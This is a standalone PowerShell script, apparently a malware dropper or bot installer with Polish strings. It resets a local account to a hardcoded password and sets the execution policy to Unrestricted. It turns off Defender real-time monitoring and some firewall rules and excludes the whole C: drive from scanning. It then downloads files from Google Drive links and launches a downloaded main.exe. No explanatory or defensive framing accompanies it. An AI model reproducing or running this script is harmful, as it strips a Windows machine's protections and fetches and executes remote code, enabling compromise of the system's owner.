$NewPassword = ConvertTo-SecureString "wFJp7uRvTJ4dnLuGZX" -AsPlainText -Force
Set-LocalUser -Name adminox -Password $NewPassword
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Force
Get-ScheduledTask -TaskName ServerManager | Disable-ScheduledTask -Verbose
Set-MpPreference -DisableRealtimeMonitoring $true
netsh advfirewall firewall set rule group="Network Discovery" new enable=No
netsh advfirewall firewall set rule group="Network 2" new enable=No
Add-MpPreference -ExclusionPath C:/
Add-MpPreference -ExclusionPath C:/BotekPobral2
$source = 'https://drive.google.com/u/0/uc?id=1z0xwe1Z3mqxbm6Y9o5I5nJ39pWCJVBPA&export=download&confirm=t&uuid=cc96ef0f-a9a3-407d-a6d9-998dccc8da3e'
$ProgressPreference = 'SilentlyContinue'
$destination = 'C:\refy.txt'
Invoke-RestMethod -Uri $source -OutFile $destination
$source = 'https://drive.google.com/u/8/uc?id=1sENJNpyT2Wa5GymTpEbR7AWUfk10hnx0&export=download&confirm=t&uuid=dacd0f24-a1e0-431e-966c-018825b5d4c5'
$ProgressPreference = 'SilentlyContinue' 
$destination = 'C:\license.txt' 
Invoke-RestMethod -Uri $source -OutFile $destination  
$source = 'https://drive.google.com/u/8/uc?id=1sVWGSv0z0kxDindHruAM6P6alLBiz6ad&export=download&confirm=t&uuid=dacd0f24-a1e0-431e-966c-018825b5d4c5'
$ProgressPreference = 'SilentlyContinue'
$destination = 'C:\main.exe'
Invoke-RestMethod -Uri $source -OutFile $destination
Start-Process -FilePath "C\main.exe" -Noexit
Write-Output "Pobrane"
